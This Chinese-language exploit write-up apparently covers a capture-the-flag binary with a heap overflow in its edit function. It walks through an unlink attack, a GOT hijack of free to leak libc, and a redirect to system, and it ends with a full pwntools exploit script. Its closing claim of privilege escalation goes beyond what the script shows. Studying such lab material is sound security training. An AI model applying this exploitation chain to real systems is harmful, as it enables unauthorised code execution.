# 漏洞利用文档

## 执行环境

基于程序静态分析和动态调试结果，执行环境如下：

**二进制文件信息**：
- 架构：amd64-64-little
- 安全特性：
  - RELRO: Partial RELRO (GOT表可写)
  - Stack: Canary found (栈保护启用)
  - NX: NX enabled (数据段不可执行)
  - PIE: No PIE (0x400000) (代码段基址固定)
- 依赖库：标准libc库(通过ldd确认)，具体版本取决于运行环境

**运行环境需求**：
- 64位Linux系统
- 需要标准C库支持
- 程序通过标准输入输出进行交互

## 漏洞成因

### 关键数据结构
- **全局指针数组 `::s` (0x602140)**：存储所有分配的内存块指针
- **索引计数器 `dword_602100` (0x602100)**：记录当前分配的块数量

### 漏洞分析
**漏洞位置**：`sub_4009E8` 函数（选项2的写入功能）

**漏洞类型**：堆溢出漏洞

**漏洞代码**：
```c
fgets(s, 16, stdin);
n = atoll(s);
ptr = (&::s)[v2];
for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
{
  ptr += i;
  n -= i;
}
```

**漏洞原因**：
1. **缺少边界检查**：函数允许用户指定任意大小的写入长度 `n`，但没有检查是否超过实际分配大小
2. **无条件写入**：循环持续读取数据直到达到用户指定的 `n` 字节，可能超出分配范围
3. **基于用户输入的写入**：攻击者可分配小内存块后指定大 `n` 值进行写入，导致堆溢出

**利用后果**：通过精心构造的写入数据覆盖堆管理结构、相邻内存块，最终实现任意代码执行。

## 漏洞利用过程

### 利用步骤及内存变化

| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | `alloc(0x100); alloc(0x30); alloc(0x80)` | - 全局数组 `::s[1]=0x7acf020`, `::s[2]=0x7acf540`, `::s[3]=0x7acf580`<br>- 堆布局建立：三个连续chunk | 创建攻击目标内存布局 |
| 2 | 构造伪造chunk并写入chunk2 | - Chunk2用户区创建伪造free chunk<br>- 覆盖Chunk3的prev_size为0x30<br>- fd/bk指向全局数组特定位置 | 准备unlink攻击条件 |
| 3 | `free(3)` | - 触发unlink操作<br>- 全局数组被修改：`::s[0]=0x602018`, `::s[1]=0x602020`, `::s[2]=0x602088` | 实现任意地址写原语 |
| 4 | 写入payload2到chunk2 | - 堆起始区域被污染<br>- 写入GOT表指针到特定位置 | 建立GOT表操作指针 |
| 5 | 劫持free@got.plt | - `free@got.plt`从原始地址改为`puts@plt` (0x400760) | 函数重定向，用于信息泄露 |
| 6 | `free(1)`触发puts调用 | - 调用free(1)实际执行puts，泄露libc地址<br>- 获取puts真实地址计算libc基址 | 泄露libc基址 |
| 7 | 计算system地址并写入 | - 计算system地址<br>- 通过任意地址写修改GOT表 | 准备获取shell |
| 8 | 交互获取shell | - 程序控制权移交，获取shell | 完成漏洞利用 |

### 关键内存状态变化
- **初始状态**：全局数组全0，堆未分配
- **分配后**：三个chunk连续布局，为溢出提供目标
- **伪造chunk后**：Chunk2用户区包含精心构造的元数据，指向全局数组
- **unlink后**：全局数组指向GOT表，获得任意地址读写能力
- **最终状态**：GOT表被劫持，system函数准备执行

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动程序并加载ELF信息
p = process('./data/sample0')
elf = ELF('./data/sample0')
libc = elf.libc
g_pointer = 0x602140  # 全局数组地址

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())  # 漏洞点：可指定任意大小写入
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

# 步骤1：创建内存布局
alloc(0x100)  # chunk1 - 主要溢出目标
alloc(0x30)   # chunk2 - 伪造chunk位置  
alloc(0x80)   # chunk3 - unlink触发目标

# 步骤2：构造伪造chunk进行堆溢出
# 伪造chunk结构：prev_size|size|fd|bk|next_prev_size|padding|chunk3_prev_size
payload = p64(0)+ p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)  # 向chunk2写入伪造数据，溢出覆盖chunk3元数据

# 步骤3：触发unlink攻击
free(3)  # 释放chunk3，触发unlink，修改全局数组指针

# 步骤4：写入GOT表指针
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)  # 通过修改的指针写入GOT地址

# 步骤5：劫持free函数为puts
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)  # 修改free@got.plt为puts@plt

# 步骤6：泄露libc地址
ret = '0x' + free(1)[:6][::-1].hex()  # 调用free(1)实际执行puts，泄露地址
puts_addr = int(ret, 16)

# 步骤7：计算system地址并准备执行
libc_addr = puts_addr - libc.sym['puts']  # 计算libc基址
system_addr = libc_addr + libc.sym['system']  # 计算system地址
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)  # 写入system地址到GOT

# 步骤8：获取shell
p.interactive()  # 交互模式，通过后续操作触发system执行获取shell
```

### 关键注释说明：
- **全局数组操作**：通过unlink修改全局数组指针，获得任意地址读写能力
- **GOT劫持**：利用Partial RELRO特性修改GOT表函数指针
- **信息泄露**：通过puts泄露libc地址，绕过ASLR
- **system执行**：最终将GOT表函数劫持为system，通过程序正常流程触发命令执行

该漏洞利用成功结合了堆溢出、unlink攻击、GOT劫持和libc地址泄露技术，在No PIE和Partial RELRO环境下实现了完整的权限提升。
